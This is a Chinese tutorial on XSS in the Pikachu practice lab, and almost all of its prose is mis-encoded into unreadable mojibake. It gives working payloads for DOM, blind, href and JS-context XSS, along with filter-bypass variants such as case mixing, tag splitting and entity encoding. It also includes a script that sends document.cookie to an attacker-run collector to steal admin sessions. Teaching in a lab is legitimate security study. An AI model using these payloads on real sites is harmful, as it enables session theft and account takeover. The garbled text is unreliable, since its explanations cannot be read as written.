è¦æ”¹å˜é¡µé¢çš„æŸä¸ªä¸œè¥¿ï¼ŒJavaScript å°±éœ€è¦è·å¾—å¯¹HTMLæ–‡æ¡£ä¸­æ‰€æœ‰å…ƒç´ è¿›è¡Œè®¿é—®çš„å…¥å£ã€‚è¿™ä¸ªå…¥å£ï¼Œè¿åŒå¯¹HTMLå…ƒç´¢è¿›è¡Œæ·»åŠ ã€ç§»åŠ¨ã€æ”¹å˜æˆ–ç§»é™¤çš„æ–¹æ³•å’Œå±æ€§ï¼Œéƒ½æ˜¯é€šè¿‡æ–‡æ¡£å¯¹è±¡æ¨¡å‹æ¥è·å¾—çš„( DOM) ã€‚-
æ‰€ä»¥ï¼Œä½ å¯ä»¥æŠŠDOMç†è§£ä¸ºä¸€ä¸ªä¸€ä¸ªè®¿é—®HTMLçš„æ ‡å‡†ç¼–ç¨‹æ¥å£ã€‚-
å¯ä»¥è‡ªå·±çœ‹ä¸€ä¸ªå…·ä½“çš„æ —å­ï¼š[w3school HTML DOM](https://www.w3school.com.cn/js/js_htmldom.asp)-
æ‰“å¼€DOMå‹xssï¼Œåœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥ä¸€ä¸²å­—ç¬¦ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa63afc6790274e33bd9f6056708d6449.png)-
æ˜¾ç¤ºç»“æœæ˜¯what do you see?ï¼Œçœ‹èµ·æ¥åº”è¯¥æ˜¯Aæ ‡ç­¾ï¼Œæ‰“å¼€é¡µé¢æºç ï¼ŒCTRL+Fæœç´¢è¿™ä¸²å­—ç¬¦ï¼Œçœ‹ä¸€ä¸‹å®ƒå…·ä½“æ˜¯åšäº†ä»€ä¹ˆæ“ä½œã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fbad088432aa146cc89e3c37ca24ba703.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œè¢«æ‹¼æ¥åˆ°äº†aæ ‡ç­¾å½“ä¸­ã€‚-
åˆ¤æ–­æ­¤å¤„æ˜¯å¦æœ‰xssæ¼æ´ï¼Œä¸ä¹‹å‰æ€è·¯ä¸€æ ·ã€‚å…ˆç¡®è®¤è¾“å…¥ç‚¹ï¼Œè¾“å…¥å°±æ˜¯inputä¹Ÿå°±æ˜¯è¾“å…¥æ¡†ã€‚è¾“å‡ºçš„è¯DOMæ˜¯çº¯å‰ç«¯æ“ä½œï¼Œè¾“å‡ºä¹Ÿæ˜¯å‰ç«¯è¾“å‡ºã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fb7e8986ae3134fc3a6264e0b1448da0b.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è“æ¡†æ¡†é€‰çš„å°±æ˜¯æˆ‘ä»¬çš„è¾“å…¥ï¼Œæˆ‘ä»¬æŠŠè¿™æ¡è¯­å¥æ‹¿å‡ºæ¥åˆ†æï¼Œåˆ©ç”¨è¾“å…¥æ„é€ ä¸€ä¸ªé—­åˆã€‚

    <a href='"+str+"'>what do you see?</a>
    
        

æˆ‘ä»¬è¿˜æ˜¯è¾“å…¥ä¸€ä¸ªå¼¹çª—ï¼Œåœ¨inputè¾“å…¥`#' onclick<span style="background:#ffff00">="alert(666)â€></span>`-
æ„æˆaæ ‡ç­¾é—­åˆï¼Œä¸”åµŒå…¥ä¸€ä¸ªå¼¹çª—ã€‚`<a href='#' onclick="alert(666)">'>what do you see?</a>`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff9753b3aa9ea487589876ea47cc364ce.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å±äºä½å±æ¼æ´ï¼Œå¥½åƒæ¯”è¾ƒé¸¡è‚‹ï¼Œä½†æ˜¯å‰ç«¯ç¼–å†™å„ç§å„æ ·ï¼Œè¿˜æ˜¯éœ€è¦æ³¨æ„çš„ã€‚-
**DOMå‹xss-x**-
xss-xå°±å±äºä¸€ä¸ªä¾‹å¤–çš„ä¾‹å­ã€‚-
åœ¨è¾“å…¥æ¡†è¾“å…¥å­—ç¬¦ï¼Œå¹¶ç‚¹å‡»è¿›è¡Œæäº¤ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8e350258243a44329ce72f2d48c71254.png)-
åŒæ ·æˆ‘ä»¬è¦çœ‹å®ƒçš„å…·ä½“æ“ä½œæ˜¯ä»€ä¹ˆï¼Œæ‰“å¼€é¡µé¢æºç è¿›è¡ŒæŸ¥çœ‹ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc740e368625b48f495edca7c2c61a7e7.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
å®ƒçš„è¾“å…¥å®é™…ä¸Šæ˜¯ä»urlä¸Šè·å–çš„ï¼Œè¿™å°±ç±»ä¼¼åå°„æ€§ã€‚-
æˆ‘ä»¬è¿˜æ˜¯å¯¹å…¶è¿›è¡Œé—­åˆï¼Œä¸ä¹‹å‰ä¸€æ ·æ˜¯aæ ‡ç­¾é—­åˆã€‚åœ¨inputè¾“å…¥`#' onclick="alert(666)â€>`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F52158cacb6dc42efa9eb646b1da52658.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç‚¹å‡»ä¹‹åï¼Œäº§ç”Ÿä¸€ä¸ª666çš„å¼¹çª—ã€‚

#### 3.2.6XSSç›²æ‰“æ¼”ç¤ºå’ŒåŸç†åˆ†æ

<span style="background:#ffff00">xssç›²æ‰“æŒ‡çš„æ˜¯ä¸€ç§æ”»å‡»åœºæ™¯</span>ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6e7681bafd6549898e56bcbb1eac2707.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_16%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
<span style="background:#ffff00">ä¹Ÿå°±æ˜¯è¯´åªæœ‰åå°ä¼šçœ‹åˆ°å‰ç«¯è¾“å…¥çš„å†…å®¹ã€‚ä»å‰ç«¯æ— æ³•åˆ¤æ–­æ˜¯å¦å­˜åœ¨XSS ,æ€ä¹ˆåŠ?-</span>
<span style="background:#ffff00">ä¸ç®¡3721ï¼Œå¾€é‡Œé¢æ’XSSä»£ç ï¼Œç„¶åç­‰å¾…,å¯èƒ½ä¼šæœ‰æƒŠå–œ!-</span>
<span style="background:#ffff00">ç”±äºæ˜¯åç«¯,å¯èƒ½å®‰å…¨è€ƒè™‘ä¸å¤ªä¸¥æ ¼ã€‚å½“ç®¡ç†å‘˜ç™»å½•æ—¶ï¼Œå°±ä¼šè¢«X !-</span>
æ‰“å¼€xssä¹‹ç›²æ‰“ï¼Œéšæ„è¾“å…¥çœ‹çœ‹æ˜¯ä»€ä¹ˆæ•ˆæœã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fcf69bfb5bccd401caa3888a7acb1291e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_12%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬è¾“å…¥çš„å†…å®¹å¹¶ä¸ä¼šåœ¨å‰ç«¯è¾“å‡ºï¼Œçœ‹èµ·æ¥åº”è¯¥æ˜¯å­˜åˆ°äº†åå°ï¼Œä¹Ÿå°±æ˜¯è¯´å¯èƒ½åªæœ‰ç®¡ç†å‘˜å¯ä»¥çœ‹ã€‚-
æˆ‘ä»¬è¾“å…¥`<script>alert('xni')</script>`ï¼Œè®¾ç½®ä¸€ä¸ªå¼¹çª—ï¼Œçœ‹çœ‹ç®¡ç†å‘˜åœ¨åå°ç™»é™†ä¸Šï¼Œæ˜¯å¦ä¼šè¢«xåˆ°ã€‚å¦‚æœè¢«xåˆ°è¿™ç§åœºæ™¯å°±å«åšç›²æ‰“ã€‚-
è¾“å…¥ä¹‹åæäº¤ï¼Œç‚¹å‡»æç¤ºï¼Œç™»å½•ç®¡ç†å‘˜ç½‘å€ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F2f648fc5ca7b424f9c8a5ebd50b16662.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_11%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
è¾“å…¥ç”¨æˆ·å¯†ç åç‚¹å‡»ç™»å½•ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F4c53c0db40fe4c9bb65232a27dd7dc9e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_15%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬å¯ä»¥å‘ç°åå°ç®¡ç†å‘˜è¢«xåˆ°ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fa3aeaea96a664c4d8a1e71bf27945692.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F3a69247e0caa48758f8153d77faaf410.png)-
è¿™ç§æƒ…å†µå°±æ˜¯xssç›²æ‰“ï¼Œå¯¹æ”»å‡»è€…æ¥è¯´åªæ˜¯å°è¯•çš„è¾“å…¥ï¼Œå¹¶ä¸çŸ¥é“åå°æ˜¯å¦è¢«è¾“å‡ºï¼Œåªæ˜¯å°è¯•çš„è¾“å…¥è·¨ç«™è„šæœ¬ã€‚ç®¡ç†å‘˜è¢«xåˆ°ï¼Œæ”»å‡»è€…æˆåŠŸã€‚è¿™ç§å±å®³æ¯”è¾ƒå¤§ï¼Œå¦‚æœåœ¨å‰ç«¯è¾“å…¥ä¸€æ®µç›—å–cookieçš„è„šæœ¬ï¼Œç®¡ç†å‘˜ä¸€ç™»é™†ï¼Œç®¡ç†å‘˜çš„cookieå°±ä¼šè¢«è·å–ã€‚æ”»å‡»è€…å°±å¯ä»¥ä¼ªè£…ç®¡ç†å‘˜ç™»é™†åå°ï¼Œåå°çš„æƒé™å°±å¤§äº†ã€‚

#### 3.2.7XSSçš„è¿‡æ»¤å’Œç»•è¿‡( filter&htmlspecialchars )

**XSSç»•è¿‡-è¿‡æ»¤-è½¬æ¢**-
0ï¼Œå‰ç«¯é™åˆ¶ç»•è¿‡ï¼Œç›´æ¥æŠ“åŒ…é‡æ”¾ï¼Œæˆ–è€…ä¿®æ”¹htmlå‰ç«¯ä»£ç -
1,å¤§å°å†™ï¼Œæ¯”å¦‚: `<SCRIPT> aLeRT(111)</sCRIpt>`-
2ï¼Œæ‹¼å‡‘: `<scri<script> pt> alert(111)</scri</script> pt>`-
3ï¼Œä½¿ç”¨æ³¨é‡Šè¿›è¡Œå¹²æ‰°: `<scri<!--test--> pt> alert(111)</sc <--test--> ript>`

**XSSç»•è¿‡-è¿‡æ»¤-ç¼–ç **-
æ ¸å¿ƒæ€è·¯:

> åå°è¿‡æ»¤äº†ç‰¹æ®Šå­—ç¬¦,æ¯”å¦‚< script>æ ‡ç­¾ï¼Œä½†è¯¥æ ‡ç­¾å¯ä»¥è¢«å„ç§ç¼–ç ï¼Œåå°ä¸ä¸€å®šä¼šè¿‡æ»¤-
> å½“æµè§ˆå™¨å¯¹è¯¥ç¼–ç è¿›è¡Œè¯†åˆ«æ—¶ï¼Œä¼šç¿»è¯‘æˆæ­£å¸¸çš„æ ‡ç­¾ï¼Œä»è€Œæ‰§è¡Œ.-
> åœ¨ä½¿ç”¨ç¼–ç æ—¶éœ€è¦æ³¨æ„ç¼–ç åœ¨è¾“å‡ºç‚¹æ˜¯å¦ä¼šè¢«æ­£å¸¸è¯†åˆ«å’Œç¿»è¯‘!

æ —å­1ï¼š-
`< img src=x onerror=â€alert( xss )"`å°†alert(â€˜xssâ€™ )è¿›è¡ŒURLç¼–ç ,å¯ä»¥æ‰§è¡Œå—

    <img src=x onerror= " alert%28%27xss%27%29" />
    
        

ä¸å¯ä»¥ï¼Œå› ä¸ºè¿™äº›å±æ€§æ ‡ç­¾å¹¶ä¸ä¼šæ­£å¸¸è§£æè¿™äº›ç¼–ç ã€‚

æ —å­2 :-
ä½¿ç”¨äº‹ä»¶å±æ€§onxxx();-
`<img src=x onerror=" alert('xss')" />`å¯ä»¥æŠŠalert("xss )è¿›è¡Œhtmlç¼–ç 

    <img srC=X onerror=" &#97;&# 108;&#101;&#114;&# 116;&#40;&#39;&#120;&#115;&#115;&#39;&#41;â€/>
    <img src=xonmouseover= "&#97;&l# 108;&# 101;&#114;&#116;&#40;&#39;&#120;&l#115;&#115;&#39;&#41;"/>
    
        

å¯ä»¥æ‰§è¡Œã€‚äº‹ä»¶æ ‡ç­¾é‡Œé¢å¹¶ä¸ä¼šæ‰§è¡Œæ ‡ç­¾é‡Œé¢çš„ä»£ç ã€‚-
**XSSç»•è¿‡çš„å§¿åŠ¿æœ‰å¾ˆå¤šå–å†³äºä½ çš„æ€è·¯å’Œå¯¹å‰ç«¯æŠ€æœ¯çš„æŒæ¡ç¨‹åº¦**-
æ‰“å¼€xssä¹‹è¿‡æ»¤æˆ‘ä»¬éšæ„è¾“å…¥ä¸€ä¸²å­—ç¬¦`<script>;'#@`-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F8762a8bfb8a149f39d34e08d1e176a95.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_14%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬æ‰“å¼€é¡µé¢æºç æŸ¥çœ‹![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe50ca9dc30fa47eaa99134d65be99a11.png)-
æˆ‘ä»¬è¾“å…¥çš„scriptåº”è¯¥æ˜¯è¢«xæ‰äº†ã€‚æˆ‘ä»¬å°è¯•å¤§å°å†™æ··åˆï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç»•è¿‡ã€‚

    <scRIPt>alert(666)</ScrIpt>
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F870ebe429b604f6588be41328c1fb8c1.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æŸ¥çœ‹ä»£ç æˆ‘ä»¬å‘ç°åªå¯¹å°å†™çš„scriptè¿›è¡Œäº†è¿‡æ»¤ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨imgæ ‡ç­¾ã€‚

    <img src=x onerror="alert(666)">
    
        

![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fb247de0bed4247439ae167ecdfdb8ffa.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
**XSSç»•è¿‡å…³äºhtmlspecialchars()å‡½æ•°**

htmlspecialchars()å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ã€‚-
é¢„å®šä¹‰çš„å­—ç¬¦æ˜¯:

> &(å’Œå·)æˆä¸º&-
> "(åŒå¼•å·)æˆä¸º"-
> '(å•å¼•å·)æˆä¸º'-
> <(å°äº)æˆä¸º<-
> â€˜>â€™(å¤§äº)æˆä¸º>

å¯ç”¨çš„å¼•å·ç±»å‹:

> ENT\_ COMPAT -é»˜è®¤ã€‚ä»…ç¼–ç åŒå¼•å·ã€‚-
> ENT QUOTES -ç¼–ç åŒå¼•å·å’Œå•å¼•å·ã€‚-
> ENT NOQUOTES -ä¸ç¼–ç ä»»ä½•å¼•å·ã€‚

æ‰“å¼€xssä¹‹html\*\*\*\*\*\*\*\*\*\*\*-
æˆ‘ä»¬è¿˜æ˜¯å…ˆè¾“å…¥ä¸€æ®µå­—ç¬¦ä¸²66666â€™â€œ<>#$%![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F10d174087db14ade80531dc766dab071.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_15%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æäº¤ä¹‹åæˆ‘ä»¬çœ‹æºç ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fe0c2f4f3c2f94aa1997dc5d96eb2e1dd.png)-
æˆ‘ä»¬å‘ç°é™¤äº†å•å¼•å·å…¶ä»–çš„ç‰¹æ®Šå­—ç¬¦éƒ½è¿›è¡Œäº†ç¼–ç ï¼Œæˆ‘ä»¬å¯ä»¥è¾“å…¥`q' onclick='alert(666)'`ç¬¬ä¸€ä¸ªå•å¼•å·æ˜¯å¯¹å‰é¢è¿›è¡Œé—­åˆã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F6a2626476c3d400c8194c59d4c35d5f9.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.8XSSè¾“å‡ºåœ¨hrefå’Œjsä¸­çš„æ¡ˆä¾‹åˆ†æ

æ‰“å¼€xssä¹‹herfï¼Œè¾“å…¥Javascript:alert(666)ï¼Œä¸å«æœ‰ç‰¹æ®Šå­—ç¬¦ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fee719dbd304941e8b0ce9ce8564f2652.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_13%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬æŸ¥çœ‹é¡µå†…æºç ![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff6690fe4268e4075af46e88dd0bcb3d1.png)åœ¨aæ ‡ç­¾çš„herfä¸­ï¼Œæˆ‘ä»¬è¿”å›é¡µé¢ç‚¹å‡»è¿”å›çš„è“è‰²å­—ä½“ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7189ee79e47f4920b998f908c9e2547e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
alertè¢«æ‰§è¡Œï¼Œå‡ºç°å¼¹çª—ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥åšå‡ºç›¸åº”é˜²èŒƒï¼Œåªå…è®¸http,httpsï¼Œå…¶æ¬¡åœ¨è¿›è¡Œhtmlspecialcharså¤„ç†ã€‚-
æ‰“å¼€xssä¹‹jsï¼Œæˆ‘ä»¬éšæ„è¾“å…¥ç„¶åæŸ¥çœ‹é¡µå†…åŸç ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc0fb80edddaf46c8ab7425a4a1261eff.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_18%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬è¾“å…¥tmac-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F7e5d8b62dfb4449195101caa4a09b3fe.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬å°è¯•é€ æˆé—­åˆï¼Œè¾“å…¥`x'</script><script>alert('xss')</script>`ï¼Œå…ˆå°†å‰é¢çš„scripté—­åˆå†æ’å…¥æˆ‘ä»¬è‡ªå·±çš„è¯­å¥ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F15ace2b8f9654a37b33071196d3e97af.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)

#### 3.2.9XSSçš„å±å®³-è·å–cookieçš„åŸç†å’Œæ¼”ç¤º

**getå‹xssåˆ©ç”¨**-
åœ¨ç®¡ç†å·¥å…·ä¸­æ‰“å¼€xssåå°![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F00e2790ce17d42c68fe6a06e133850fa.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_18%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ•°æ®åº“ç”¨æˆ·åä¸å¯†ç ï¼Œè¦æ”¹æ­£ç¡®ï¼Œæˆ–è€…ç›´æ¥æŠŠè‡ªå·±çš„æ”¹æˆrootï¼Œrootã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Ff8d42b7f8ba54620b21831e6460a7f9f.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_19%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
ç™»é™†ä¹‹åï¼Œç‚¹å‡»cookieæ”¶é›†ï¼Œæ˜¾ç¤ºä¸€ä¸ªç»“æœï¼Œé»˜è®¤æ²¡æœ‰æ•°æ®ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F09de783262864b6cb63138ba60b90ac6.png)-
æ‰“å¼€åå°„å‹xss(get)ï¼Œé¦–å…ˆå…ˆè§£å†³å­—ç¬¦é•¿åº¦çš„é—®é¢˜ï¼Œ3.2.3æœ‰ä»‹ç»ä¸å†èµ˜è¿°äº†ï¼Œä¹‹å‰æˆ‘ä»¬è¾“å…¥payloadå‡ºç°å¼¹çª—ï¼Œæˆ‘ä»¬è¿™æ¬¡è¾“å…¥ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„payloadï¼Œç›®çš„å°±æ˜¯ä¸ºäº†è·å–ç”¨æˆ·æœ¬åœ°çš„cookieï¼Œå‘é€åˆ°æˆ‘ä»¬çš„xssåå°ã€‚

    <script>document.location = 'http://127.0.0.1/pikachu-master/pikachu-master/pkxss/xcookie/cookie.php?cookie=' +document.cookie;</script>
    
    
        

è¿™é‡Œçš„payloadéœ€è¦è‡ªå·±ä¿®æ”¹ï¼Œç”±äºéƒ½æ˜¯æœ¬åœ°ï¼Œå…¨éƒ¨æ”¹æˆ127.0.0.1å³å¯ï¼Œåé¢å°±æ˜¯wwwåçš„è·¯å¾„ã€‚æˆ‘è‡ªå·±phpstudyçš„wwwåçš„è·¯å¾„ä¸ºpikachu-master/pikachu-master/pkxss/xcookie/cookie.phpï¼Œæ³¨æ„ä¸€ä¸‹éœ€è¦ä¿®æ”¹è¿™ä¸¤ä¸ªæ–‡ä»¶ä¸­çš„ä»£ç ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fc2079fdf03ce4d5aaee2cee2052c8dea.png)

æ‰§è¡Œä¹‹åï¼Œè·³å›äº†é¦–é¡µã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F9eca8b9b73ad45a2a1fca41434f24ee0.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ‰“å¼€xssåå°ï¼Œåˆ·æ–°ï¼Œæ˜¾ç¤ºè·å–cookieã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F613b6969bf82471a85e944339ba73c6e.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
**postxss**-
è¾“å…¥è´¦å·å¯†ç ç™»å½•ï¼Œé¡µé¢è·³è½¬ï¼Œè¾“å…¥å­—ç¬¦ï¼Œä¸éš¾å‘ç°å¹¶æ²¡æœ‰åœ¨urlä¸­æäº¤å‚æ•°ã€‚-
![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2F67b9d374f7c84bbe88652672026163af.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æ‰“å¼€burpæŸ¥çœ‹æŠ“åŒ…ã€‚![](https://cubox.pro/c/filters:no_upscale()?imageUrl=https%3A%2F%2Fimg-blog.csdnimg.cn%2Fdbd41ee23ca54a4d9fce32a4c84d8820.png%3Fx-oss-process%3Dimage%2Fwatermark%2Ctype_d3F5LXplbmhlaQ%2Cshadow_50%2Ctext_Q1NETiBAd3lkMjAwMQ%3D%3D%2Csize_20%2Ccolor_FFFFFF%2Ct_70%2Cg_se%2Cx_16)-
æˆ‘ä»¬å‘ç°messageæ˜¯é€šè¿‡è¯·æ±‚ä½“è¿”å›ï¼Œé€šè¿‡postæ–¹å¼ä¼ åˆ°åå°ã€‚è¿™æ ·çš„è¯æ˜¯ä¸èƒ½æŠŠæ¶æ„ä»£ç åµŒå…¥urlä¸­ã€‚-
POSTå‹XSSè·å–cookieåŸç†-
